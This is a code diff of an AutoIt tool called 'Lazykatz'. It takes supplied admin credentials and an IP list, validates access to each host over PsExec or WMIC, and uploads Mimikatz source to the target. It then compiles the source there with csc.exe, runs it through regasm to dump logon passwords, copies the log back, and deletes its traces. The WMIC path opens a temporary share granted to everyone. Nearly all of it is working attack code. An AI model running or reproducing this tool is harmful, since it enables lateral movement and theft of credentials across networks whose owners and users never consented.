@@ -4,6 +4,16 @@
 
 #include <File.au3>
 #include <GUIConstants.au3>
+#include <GUIConstantsEx.au3>
+#include <GuiEdit.au3>
+#include <GuiStatusBar.au3>
+#include <WindowsConstants.au3>
+
+
+;Local $iReturn = RunWait(@ComSpec & " /C " & 'powershell.exe -exec bypass -nop -command "import-module c:\Powerview.ps1;Get-NetDomainController" > b2.txt',"",@SW_HIDE,0x10000)
+
+
+; PREPARING GUI
 
 Global $dir = @WorkingDir
 FileDelete(@TempDir & "\psexec.exe")
@@ -12,15 +22,20 @@ FileInstall("katz.cs", @TempDir & "\katz.cs")
 FileInstall("key.snk", @TempDir & "\key.snk")
 
 $Form1 = GUICreate("Lazykatz", 622, 448, 192, 125)
+Global $idEdit = GUICtrlCreateLabel("*** LAZYKATZ LOG ***", 350, 40, 250, 300)
 GUICtrlCreateLabel("Username", 80, 40, 90, 25)
 GUICtrlCreateLabel("Password", 80, 100, 90, 25)
 GUICtrlCreateLabel("Choose IP list", 80, 155, 90, 25)
+GUICtrlCreateLabel("Choose Method", 80, 215, 90, 25)
 Global $USER1 = GUICtrlCreateInput("", 180, 40, 90, 25)
 Global $PASS1 = GUICtrlCreateInput("", 180, 100, 90, 25,0x0020)
 $Button1 = GUICtrlCreateButton("Browse", 180, 150, 81, 25)
-$run = GUICtrlCreateButton("Start",80, 250, 120, 25)
-
+$run = GUICtrlCreateButton("Start",80, 300, 120, 25)
+$radio1 = GUICtrlCreateRadio("PsExec",180, 210, 50, 25)
+$radio2 = GUICtrlCreateRadio("WMIC",250, 210, 50, 25)
+Global $log = ""
 GUISetState(@SW_SHOW)
+
 While 1
     $msg = GuiGetMsg()
     Select
@@ -28,55 +43,109 @@ While 1
         ExitLoop
     Case $msg = $Button1
 		Global $list = FileOpenDialog("Select the IP list", @WorkingDir, "text (*.txt)", 1 + 4 )
-		GUICtrlCreateLabel($list, 300, 155, 1000, 25)
-        ;MsgBox(4096,"","You chose " & $list)
+		$log = "Selected the IP list"&@CRLF&@CRLF&$list&@CRLF
+		_GUICtrlEdit_SetText($idEdit, $log)
+		_GUICtrlEdit_LineScroll($idEdit, 0, _GUICtrlEdit_GetLineCount($idEdit))
+		Case $msg = $radio1
+			Global $method = "psexec"
+		case $msg = $radio2
+			Global $method = "wmic"
 		Case $msg = $run
-		Global $user = GUICtrlRead($USER1)
-		Global $pass = GUICtrlRead($PASS1)
-		attack()
+			Global $user = GUICtrlRead($USER1)
+			Global $pass = GUICtrlRead($PASS1)
+			attack()
     Case Else
     ;;;;;;;
     EndSelect
 WEnd
 
+; ATTACK FUNTION
 Func attack()
 FileChangeDir(@TempDir)
-
 FileOpen($list, 0)
 FileDelete("output.txt")
 
 For $j = 1 to _FileCountLines($list)
     $ip = FileReadLine($list, $j)
-	GUICtrlCreateLabel("", 80, 200, 200, 25)
 	Sleep(1000)
-	GUICtrlCreateLabel("Targetting - "&$ip, 80, 200, 200, 25)
-
+	$log = "*** LAZYKATZ LOG ***"&@CRLF&@CRLF&"Targetting - "&$ip&@CRLF&@CRLF
+	_GUICtrlEdit_SetText($idEdit, $log)
+	_GUICtrlEdit_LineScroll($idEdit, 0, _GUICtrlEdit_GetLineCount($idEdit))
 global $status = 1
 
-RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /u:"&$user&" "&$pass&" > output.txt 2>&1","",@SW_HIDE,0x10000)
+;VALIDATING CREDENTIALS
+
+if $method = "psexec" Then
+	logprint("Validating credentials using PsExec" & @CRLF)
+	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /u:"&$user&" "&$pass&" > output.txt 2>&1","",@SW_HIDE,0x10000)
+EndIf
+
+if $method = "wmic" Then
+	logprint("Validating credentials using WMIC" & @CRLF)
+	RunWait(@ComSpec & " /C " & 'wmic /node:'&$ip&' /user:'&$user&' /password:'&$pass &' os get status > output.txt 2>&1',"",@SW_HIDE,0x10000)
+EndIf
+;----------------------------------------------
 
 local $file = "output.txt"
-FileOpen($file, 0)
 
+If FileGetSize($file) < 20 Then
+		logprint("Error connecting - "&$ip & @CRLF)
+		global $status = 0
+EndIf
+
+FileOpen($file, 0)
 For $i = 1 to _FileCountLines($file)
     $line = FileReadLine($file, $i)
+	;MsgBox("","",$line)
 	if StringInStr($line, "error") Then
-		;MsgBox("","",$line)
 		Sleep(1000)
-		GUICtrlCreateLabel("Error connecting - "&$ip, 80, 200, 200, 25)
+		logprint("Error connecting - "&$ip & @CRLF)
 	global $status = 0
 	EndIf
 	Next
 FileClose($file)
 
 if not $status = 0 Then
+		logprint("Credentials are valid" & @CRLF)
+;UPLOAD/COPY ATTACK FILES ON TARGET AND IDENTIFY OS TYPE
 
-RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "copy /Y key.snk \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
+if $method = "psexec" Then
+		logprint("Uploading files on target using PsExec" & @CRLF)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "copy /Y key.snk \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h systeminfo | find /I "System Type:" > os.txt',"",@SW_HIDE,0x10000)
+EndIf
 
-RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h systeminfo | find /I "System Type:" > os.txt',"",@SW_HIDE,0x10000)
+if $method = "wmic" Then
+	While Not FileExists("\\"&$ip&"\test$")
+	logprint("Preparing for temporary remote share" & @CRLF)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo @echo off > c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo setlocal enabledelayedexpansion >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo set b=z1 >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo for /f \"tokens=3\" %%a in ('&"'help pushd') do ( >> c:\windows\temp\test.bat"&'"',"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo set b=%%a>> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo net share test$=c:\windows\temp /grant:everyone!b:~4!full >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo ) >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
+	logprint("Enabling temporary remote share" & @CRLF)
+	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
+	sleep (10000)
+	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\test$ /u:"&$user&" "&$pass&"","",@SW_HIDE,0x10000)
+	WEnd
+	logprint("Uploading files on remote share using WMIC" & @CRLF)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\katz.cs","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\key.snk","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\test$\","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "copy /Y key.snk \\"&$ip&"\test$\","",@SW_HIDE,0x10000)
+
+	RunWait(@ComSpec & " /C " & 'wmic /node:'&$ip&' /user:'&$user&' /password:'&$pass &' os get osarchitecture > os.txt 2>&1',"",@SW_HIDE,0x10000)
+
+	;RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' share call create "","","",lazykatz,"","c:\windows\temp\lazy",0',"",@SW_HIDE,0x10000)
+
+EndIf
+
+;--------------------------------------------------------
 
 local $osfile = "os.txt"
 FileOpen($osfile, 0)
@@ -84,43 +153,117 @@ FileOpen($osfile, 0)
 For $i = 1 to _FileCountLines($osfile)
     $line = FileReadLine($osfile, $i)
 	if StringInStr($line, "86") Then
-	;MsgBox("","","x86")
 	global $os = ""
 	Else
 	global $os = "64"
 	EndIf
+	;MsgBox("","",$os)
 	Next
 FileClose($osfile)
+		logprint("Identified "&$os&"bit OS" & @CRLF)
+; IDENTIFY .NET FRAMEWORK
+if $method = "psexec" Then
+	RunWait(@ComSpec & " /C " & "dir /L /A /B /S \\"&$ip&'\c$\windows\Microsoft.NET\Framework'&$os&'\ | find /I "regasm.exe" | find /I /V "regasm.exe.conf" | find /I /V "v1.1." > framework.txt',"",@SW_HIDE,0x10000)
+	Global $split = 8
+EndIf
+if $method = "wmic" Then
+	_FileCreate ("framework.txt")
+	RunWait(@ComSpec & " /C " & 'wmic  /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c dir /L /A /B /S c:\windows\Microsoft.NET\Framework'&$os&'\ | find \"regasm.exe\" | find /I /V \"regasm.exe.conf\" > c:\windows\temp\framework.txt"',"",@SW_HIDE,0x10000)
+	while FileGetSize("framework.txt") = 0
+			Sleep (1000)
+			RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\framework.txt framework.txt","",@SW_HIDE,0x10000)
+			Global $split = 5
+	WEnd
+EndIf
 
-RunWait(@ComSpec & " /C " & "dir /L /A /B /S \\"&$ip&'\c$\windows\Microsoft.NET\Framework'&$os&'\ | find /I "regasm.exe" | find /I /V "regasm.exe.conf" | find /I /V "v1.1." > framework.txt',"",@SW_HIDE,0x10000)
+;--------------------------------------------
 
 local $fwfile = "framework.txt"
 FileOpen($fwfile, 0)
 
 For $i = 1 to _FileCountLines($fwfile)
     $line = FileReadLine($fwfile, $i)
-	global $fw = StringSplit($line, '\', $STR_ENTIRESPLIT)[8]
+	global $fw = StringSplit($line, '\', $STR_ENTIRESPLIT)[$split]
 	;MsgBox("","",$fw)
 	ExitLoop
 	Next
 FileClose($fwfile)
-
+logprint("Will use .NET Firmware "&$fw&"" & @CRLF)
+; GENERATING LAZY.BAT
 if $fw Then
 RunWait(@ComSpec & " /C " & "echo @echo off > lazy.bat","",@SW_HIDE,0x10000)
 RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:c:\windows\temp\mimi.exe /keyfile:c:\windows\temp\key.snk /unsafe c:\windows\temp\katz.cs >> lazy.bat","",@SW_HIDE,0x10000)
 RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "log c:\windows\temp\mimikatz.log" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "copy /Y lazy.bat \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h c:\windows\temp\lazy.bat',"",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\lazy.bat","",@SW_HIDE,0x10000)
+
+;---------------------------------
+;COPY LAZY.BAT ON TARGET
+if $method = "psexec" Then
+	RunWait(@ComSpec & " /C " & "copy /Y lazy.bat \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
+EndIf
+if $method = "wmic" Then
+	RunWait(@ComSpec & " /C " & "copy /Y lazy.bat \\"&$ip&"\test$\","",@SW_HIDE,0x10000)
+EndIf
+logprint("Uploaded lazy.bat on target" & @CRLF)
+;---------------------------------
+;EXECUTING LAZY.BAT ON TARGET
+if $method = "psexec" Then
+	RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h c:\windows\temp\lazy.bat',"",@SW_HIDE,0x10000)
+EndIf
+
+if $method = "wmic" Then
+	While Not FileExists("\\"&$ip&"\test$\mimikatz.log")
+		RunWait(@ComSpec & " /C " & 'wmic  /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c c:\windows\temp\lazy.bat"',"",@SW_HIDE,0x10000)
+		Sleep(10000)
+	WEnd
+EndIf
+;--------------------------------
+
+logprint("Executed lazy.bat on target" & @CRLF)
+
+;COPY MIMIKATZ.LOG FROM TARGET AND CLEAN TARGET
+
+
+if $method = "psexec" Then
+	logprint("Copying mimikatz.log from target" & @CRLF)
+	RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
+	logprint("Cleaning uploded files and established session" & @CRLF)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\lazy.bat","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /delete","",@SW_HIDE,0x10000)
+EndIf
+if $method = "wmic" Then
+	While FileGetSize("\\"&$ip&"\test$\mimikatz.log") = 0
+		Sleep(1000)
+	WEnd
+	logprint("Cleaning uploded files" & @CRLF)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\katz.cs","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\key.snk","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimi.exe","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\lazy.bat","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\test.bat","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\framework.txt","",@SW_HIDE,0x10000)
+	logprint("Copying mimikatz.log from target" & @CRLF)
+	RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimikatz.log","",@SW_HIDE,0x10000)
+	While FileExists("\\"&$ip&"\test$")
+		logprint("Disabling temporary remote share" & @CRLF)
+		RunWait(@ComSpec & " /C " & 'wmic  /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' SHARE where name="test$" call delete',"",@SW_HIDE,0x10000)
+		sleep(1000)
+	WEnd
+EndIf
+;--------------------------------
 EndIf
 EndIf
 Next
 FileClose($list)
 MsgBox("","","Attack finished.")
 Exit
+EndFunc
+func logprint($catch)
+	$log &= $catch & @CRLF
+	_GUICtrlEdit_SetText($idEdit, $log)
+	_GUICtrlEdit_LineScroll($idEdit, 0, _GUICtrlEdit_GetLineCount($idEdit))
 EndFunc
